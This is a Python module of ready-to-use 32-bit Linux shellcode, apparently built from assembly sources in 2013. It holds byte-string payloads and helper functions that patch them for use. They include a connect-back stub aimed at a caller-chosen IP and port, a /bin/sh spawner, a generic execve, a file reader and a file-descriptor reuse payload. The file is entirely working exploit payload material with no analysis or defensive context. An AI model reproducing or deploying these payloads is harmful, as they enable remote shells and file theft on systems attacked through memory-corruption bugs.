#!/usr/bin/python

# THIS FILE WAS GENERATED BY RUNNING MAKE
# IF YOU WANT TO MODIFY THIS FILE, YOU SHOULD MODIFY THE SOURCE IN src/ THEN RUN make

# Date Created:
# Tue Oct 22 03:48:55 UTC 2013

# uname -a:
# Linux ubuntu 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 i686 i686 i386 GNU/Linux

# assembler:
# GNU assembler (GNU Binutils for Ubuntu) 2.22
# Copyright 2011 Free Software Foundation, Inc.
# This program is free software; you may redistribute it under the terms of
# the GNU General Public License version 3 or later.
# This program has absolutely no warranty.
# This assembler was configured for a target of `i686-linux-gnu'.

connect_shellcode = ""
connect_shellcode += "\xeb\x71\x5e\xb8\x66\x00\x00\x00\xbb\x01\x00\x00\x00\x6a\x00\x6a"
connect_shellcode += "\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x83\xf8\x00\x7c\x48\x89"
connect_shellcode += "\xc7\xb8\x66\x00\x00\x00\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89"
connect_shellcode += "\xe1\xcd\x80\x83\xc4\x0c\x83\xf8\x00\x75\x2c\xb8\x3f\x00\x00\x00"
connect_shellcode += "\x89\xfb\xb9\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb"
connect_shellcode += "\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x03"
connect_shellcode += "\x00\x00\x00\xcd\x80\xeb\x19\xb8\x01\x00\x00\x00\xbb\x00\x00\x00"
connect_shellcode += "\x00\xcd\x80\xe8\x8a\xff\xff\xff\x02\x00\x04\xd2\x7f\x00\x00\x01"

execve_shellcode = ""
execve_shellcode += "\xeb\x37\x5e\x6a\x00\x89\xf0\xeb\x03\x83\xc0\x01\x80\x38\x00\x74"
execve_shellcode += "\x0b\x50\x80\x38\x00\x74\xf2\x83\xc0\x01\xeb\xf6\x6a\x00\x89\xe2"
execve_shellcode += "\x8d\x4c\x24\x04\x8b\x19\xb8\x0b\x00\x00\x00\xcd\x80\xb8\x01\x00"
execve_shellcode += "\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc4\xff\xff\xff\x2d\x61"
execve_shellcode += "\x00\x2f\x62\x69\x6e\x2f\x75\x6e\x61\x6d\x65\x00\x00"

execve_sh_shellcode = ""
execve_sh_shellcode += "\xeb\x13\x5e\xb8\x0b\x00\x00\x00\x89\xf3\x6a\x00\x56\x89\xe1\x6a"
execve_sh_shellcode += "\x00\x89\xe2\xcd\x80\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
execve_sh_shellcode += "\x68\x00"

exit_shellcode = ""
exit_shellcode += "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"

helloworld_shellcode = ""
helloworld_shellcode += "\xeb\x31\x5e\x89\xf0\x51\x89\xc1\x80\x39\x00\x74\x05\x83\xc1\x01"
helloworld_shellcode += "\xeb\xf6\x29\xc1\x89\xc8\x59\x89\xc2\x89\xf1\xbb\x01\x00\x00\x00"
helloworld_shellcode += "\xb8\x04\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00"
helloworld_shellcode += "\x00\xcd\x80\xe8\xca\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f"
helloworld_shellcode += "\x72\x6c\x64\x21\x0a\x00"

readfile_shellcode = ""
readfile_shellcode += "\xeb\x57\x5e\xb8\x05\x00\x00\x00\x89\xf3\xb9\x00\x00\x00\x00\xba"
readfile_shellcode += "\x00\x00\x00\x00\xcd\x80\x89\xc7\x6a\x00\xb8\x03\x00\x00\x00\x89"
readfile_shellcode += "\xfb\x89\xe1\xba\x01\x00\x00\x00\xcd\x80\x83\xf8\x00\x7e\x1e\xb8"
readfile_shellcode += "\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xe1\xba\x01\x00\x00\x00"
readfile_shellcode += "\xcd\x80\xeb\xd6\xb8\x06\x00\x00\x00\x89\xfb\xcd\x80\xb8\x01\x00"
readfile_shellcode += "\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xa4\xff\xff\xff\x72\x65"
readfile_shellcode += "\x61\x64\x66\x69\x6c\x65\x2e\x73\x00"

reusefd_shellcode = ""
reusefd_shellcode += "\xeb\x2f\x5e\x8b\x3e\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x00\x00\x00"
reusefd_shellcode += "\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x01\x00\x00\x00\xcd"
reusefd_shellcode += "\x80\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x03\x00\x00\x00\xcd\x80\xeb"
reusefd_shellcode += "\x09\xe8\xcc\xff\xff\xff\x05\x00\x00\x00"


def connect(ip, port):
	import struct
	import socket
	params = struct.pack("!H", port) + socket.inet_aton(ip)
	return connect_shellcode[:-6] + params


def execve(parameter_list):
	params = ""
	for x in reversed(parameter_list):
		params += x + "\x00"
	params += "\x00"
	return execve_shellcode[:-(len("-a\x00/bin/uname\x00\x00"))] + params

def execve_sh():
	return execve_sh_shellcode


def exit():
	return exit_shellcode


def helloworld():
	return helloworld_shellcode


def readfile(filename):
	params = filename + "\x00"
	return readfile_shellcode[:-(len("readfile.s\x00"))] + params


def reusefd(fd):
	import struct
	params = struct.pack("<I", int(fd))
	return reusefd_shellcode[:-4] + params

